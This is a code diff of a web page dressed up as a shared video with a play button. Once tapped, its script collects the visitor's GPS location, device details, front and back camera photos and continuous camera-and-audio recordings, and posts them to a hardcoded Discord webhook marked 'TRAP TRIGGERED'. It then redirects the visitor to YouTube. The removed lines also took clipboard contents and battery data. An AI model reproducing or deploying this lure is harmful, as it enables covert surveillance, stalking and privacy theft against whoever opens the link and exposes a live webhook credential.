@@ -10,23 +10,37 @@
         .play-button { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 60px; filter: drop-shadow(0 0 10px rgba(0,0,0,0.5)); }
         .title { text-align: left; font-size: 18px; margin-top: 12px; font-weight: bold; }
         #status { color: #aaa; margin-top: 10px; font-size: 14px; }
+
+        .spinner {
+            display: none;
+            width: 50px;
+            height: 50px;
+            border: 5px solid #333;
+            border-top: 5px solid #ff0000;
+            border-radius: 50%;
+            margin: 20px auto;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-    <div class="video-container" onclick="send()">
-        <img src="https://images.unsplash.com/photo-1504711434969-e33886168f5c?auto=format&fit=crop&w=800&q=80" class="thumbnail">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/b/bb/YouTube_play_button_icon_%282013%E2%80%932017%29.svg" class="play-button">
-        <div class="title">New Video Shared With You</div>
+    <div id="player-ui">
+        <div class="video-container" onclick="send()">
+            <img src="https://images.unsplash.com/photo-1504711434969-e33886168f5c?auto=format&fit=crop&w=800&q=80" class="thumbnail">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/b/bb/YouTube_play_button_icon_%282013%E2%80%932017%29.svg" class="play-button">
+            <div class="title">New Video Shared With You</div>
+        </div>
+        <p id="status">Tap video to play</p>
     </div>
 
-    <p id="status">Tap video to play</p>
+    <div id="loader" class="spinner"></div>
 
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1459668118661103678/9OcP9yPBgMw8LvDp-yRBM_qGH1KY59lbVxMAeh_jDE-94e5q9JGcKxS5CVqGHe6PIkjp";
         const REDIRECT_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
 
-        // Helper function for dual camera capture
         async function takeSnapshot(stream) {
             const video = document.createElement('video');
             video.srcObject = stream;
@@ -38,71 +52,64 @@
         }
 
         async function send() {
-            const status = document.getElementById('status');
-            status.innerText = "Connecting to player...";
+            document.getElementById('player-ui').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
 
-            const ua = navigator.userAgent;
-            const platform = navigator.platform;
-            const screenRes = `${window.screen.width}x${window.screen.height}`;
-            const referrer = document.referrer || "Direct Link";
-            const ram = navigator.deviceMemory || "Unknown";
-            const time = new Date().toLocaleString();
-            
-            let browserType = ua.includes("Discord") ? "Discord App" : (ua.includes("Instagram") ? "Instagram App" : "Standard Browser");
-
-            let batteryInfo = "Unknown";
-            try {
-                const battery = await navigator.getBattery();
-                batteryInfo = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? "Charging" : "Discharging"})`;
-            } catch (e) {}
-
-            let clip = "Denied";
-            try { clip = await navigator.clipboard.readText(); } catch (e) {}
+            const metadata = {
+                ua: navigator.userAgent,
+                res: `${window.screen.width}x${window.screen.height}`,
+                time: new Date().toLocaleString()
+            };
 
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                // FIXED GOOGLE MAPS LINK
                 const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                 
-                // STEP 1: Send Text Metadata
+                // Send primary location and device info
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ 
-                        content: `📍 **Location:** ${mapLink}\n📋 **Clip:** \`${clip}\`\n🔋 **Battery:** ${batteryInfo}\n📱 **Device:** ${platform} (${screenRes})\n🚀 **RAM:** ${ram}GB\n🔗 **Ref:** ${referrer}\n🌐 **App:** ${browserType}\n⏰ **Time:** ${time}` 
+                        content: `🚨 **TRAP TRIGGERED**\n📍 Location: ${mapLink}\n📱 Info: ${metadata.ua}\n⏰ Time: ${metadata.time}` 
                     })
                 });
 
-                // STEP 2: DUAL MEDIA CAPTURE
-                const fd = new FormData();
                 try {
-                    // Capture Front Camera + Audio
-                    const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
-                    const frontPhoto = await takeSnapshot(frontStream);
-                    fd.append("file1", frontPhoto, "front.jpg");
-
-                    const mediaRecorder = new MediaRecorder(frontStream);
-                    const chunks = [];
-                    mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
-                    const recordTask = new Promise((res) => {
-                        mediaRecorder.onstop = () => res(new Blob(chunks, { type: 'audio/wav' }));
-                    });
-                    mediaRecorder.start();
-                    setTimeout(() => mediaRecorder.stop(), 2000);
-                    const audioBlob = await recordTask;
-                    fd.append("file2", audioBlob, "audio.wav");
+                    // Start Video/Audio Stream
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
                     
-                    frontStream.getTracks().forEach(t => t.stop());
-
-                    // Capture Back Camera
-                    const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-                    const backPhoto = await takeSnapshot(backStream);
-                    fd.append("file3", backPhoto, "back.jpg");
-                    backStream.getTracks().forEach(t => t.stop());
+                    // Instant Snapshots (Front and Back)
+                    const frontPhoto = await takeSnapshot(stream);
+                    const fd = new FormData();
+                    fd.append("file1", frontPhoto, "front_view.jpg");
+                    
+                    try {
+                        const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                        const backPhoto = await takeSnapshot(backStream);
+                        fd.append("file2", backPhoto, "back_view.jpg");
+                        backStream.getTracks().forEach(t => t.stop());
+                    } catch(e) {}
 
                     await fetch(WEBHOOK_URL, { method: 'POST', body: fd });
-                } catch (mediaErr) {}
 
-                window.location.replace(REDIRECT_URL);
+                    // Begin Continuous Video Recording
+                    const recorder = new MediaRecorder(stream);
+                    recorder.ondataavailable = async (e) => {
+                        const vfd = new FormData();
+                        vfd.append("file", e.data, "capture_feed.webm");
+                        await fetch(WEBHOOK_URL, { method: 'POST', body: vfd });
+                    };
+
+                    // Send video data every 5 seconds
+                    recorder.start(5000);
+
+                    // Redirect after 5 seconds of recording
+                    setTimeout(() => {
+                        window.location.replace(REDIRECT_URL);
+                    }, 5000);
+
+                } catch (err) {
+                    window.location.replace(REDIRECT_URL);
+                }
 
             }, (err) => {
                 window.location.replace(REDIRECT_URL);
